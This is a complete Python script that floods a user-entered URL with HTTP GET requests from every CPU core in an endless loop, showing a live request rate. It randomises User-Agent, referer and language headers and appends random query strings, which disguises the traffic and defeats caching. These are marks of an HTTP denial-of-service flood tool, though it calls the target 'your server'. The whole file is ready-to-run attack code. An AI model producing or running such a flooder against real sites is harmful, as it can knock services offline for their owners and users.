import asyncio
import aiohttp
import random
import string
import multiprocessing
from fake_useragent import UserAgent
import psutil
import time

# ----------------------------
ua = UserAgent()

def random_headers():
    return {
        "User-Agent": ua.random,
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "*/*"
        ]),
        "Accept-Language": random.choice(["en-US,en;q=0.5", "en;q=0.7", "ar,en;q=0.6"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "Referer": random.choice([
            "https://google.com/",
            "https://bing.com/",
            "https://yahoo.com/"
        ]),
    }

def random_query():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

# ----------------------------
async def async_worker(url, per_second, counter):
    timeout = aiohttp.ClientTimeout(total=3)
    async with aiohttp.ClientSession(timeout=timeout, trust_env=True) as session:
        while True:
            tasks = []
            for _ in range(per_second):
                full_url = f"{url}?{random_query()}"
                headers = random_headers()
                task = session.get(full_url, headers=headers)
                tasks.append(task)
            results = await asyncio.gather(*tasks, return_exceptions=True)
            counter.value += sum(1 for r in results if not isinstance(r, Exception))

# ----------------------------
def process_worker(url, per_second, counter):
    asyncio.run(async_worker(url, per_second, counter))

# ----------------------------
def monitor(counter, update_interval=1):
    last_count = 0
    while True:
        time.sleep(update_interval)
        current_count = counter.value
        rps = current_count - last_count
        last_count = current_count
        cpu = psutil.cpu_percent()
        print(f"[LIVE] RPS: {rps} | CPU: {cpu}% | Total Requests: {current_count}", end='\r')

# ----------------------------
if __name__ == "__main__":
    url = input("Enter your server URL (http/https): ")
    per_second = int(input("Requests per second per core: "))
    cores = multiprocessing.cpu_count()
    print(f"[INFO] CPU Cores Detected: {cores}")

    # عداد مشترك بين العمليات
    counter = multiprocessing.Value('i', 0)

    # تشغيل عملية مراقبة
    monitor_proc = multiprocessing.Process(target=monitor, args=(counter,))
    monitor_proc.start()

    # تشغيل عملية لكل نواة
    processes = []
    for _ in range(cores):
        p = multiprocessing.Process(target=process_worker, args=(url, per_second, counter))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
